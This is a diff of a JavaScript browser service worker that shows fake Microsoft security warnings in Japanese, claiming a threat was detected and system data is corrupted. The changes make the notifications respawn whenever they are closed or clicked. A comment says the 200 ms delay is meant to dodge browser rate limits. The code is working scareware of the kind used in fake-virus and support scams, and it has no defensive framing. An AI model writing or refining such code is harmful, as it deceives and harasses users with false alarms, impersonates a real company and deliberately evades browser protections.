@@ -2,27 +2,30 @@
 function spawn(registration) {
     const isIcon = Math.random() > 0.5;
     registration.showNotification(isIcon ? "⚠ Microsoft警告" : "SYSTEM ERROR", {
-        body: isIcon ? "脅威を検出しました。システムを保護してください。" : "致命的なエラー: 0x800410",
+        body: isIcon ? "脅威を検出しました。直ちに駆除が必要です。" : "システムデータ破損: 0x800410",
         icon: "https://img.icons8.com/color/96/microsoft.png",
-        tag: 'zombie-task', // 常に1つだけ表示させるためのタグ
-        requireInteraction: true // ユーザーがアクションを起こすまで消えない
+        // tagをあえて外すことで、新しい通知として認識させやすくします
+        requireInteraction: true 
     });
 }
 
-// 最初の起動メッセージを受け取ったとき
+// 最初の起動命令
 self.addEventListener('message', (event) => {
     if (event.data === 'start') {
         spawn(self.registration);
     }
 });
 
-// 通知が閉じられた（×ボタンなど）時のみ発動！
+// ❌マークやスワイプで消された時に補充
 self.addEventListener('notificationclose', (event) => {
-    // 閉じられた瞬間に次の1つを補充する
-    spawn(self.registration);
+    // 0.2秒だけ待ってから出すと、ブラウザの連続動作制限に引っかかりにくいです
+    setTimeout(() => {
+        spawn(self.registration);
+    }, 200);
 });
 
-// 通知がクリックされた時は、何も補充せず閉じるだけ
+// 通知そのものをクリックした時も補充
 self.addEventListener('notificationclick', (event) => {
-    event.notification.close();
+    event.notification.close(); // 通知を閉じる
+    spawn(self.registration);
 });
